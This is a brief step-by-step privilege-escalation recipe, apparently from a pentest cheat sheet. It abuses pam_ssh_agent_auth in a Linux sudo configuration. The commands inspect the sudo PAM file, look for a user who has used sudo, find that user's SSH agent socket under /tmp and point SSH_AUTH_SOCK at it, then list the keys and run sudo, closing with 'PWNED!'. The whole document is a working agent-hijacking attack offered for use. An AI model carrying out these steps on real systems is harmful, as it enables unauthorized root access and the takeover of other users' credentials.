## STEPS:

### 1) Check if PAM for sudo has been configured to accept SSH keys: 

    cat /etc/pam.d/sudo

#### auth sufficient pam_ssh_agent_auth.so file=/etc/ssh/sudo_authorized_keys

#### session    required   pam_env.so readenv=1 user_readenv=0
#### session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
#### @include common-auth
#### @include common-account
#### @include common-session-noninteractive

## 2) Check if the user that has signed in has used sudo: 

    ps aux

## 3) Find an SSH agent socket file fot the shell process we can access: 

    ls -la  /tmp/ssh-WHATEVER/agent.####

## 4) 

    export SSH_AUTH_SOCK=/tmp/ssh-WHATEVER/agent.####

## 5) 

    ssh-add -l

## 6) 

    sudo -l

## 7) PWNED!
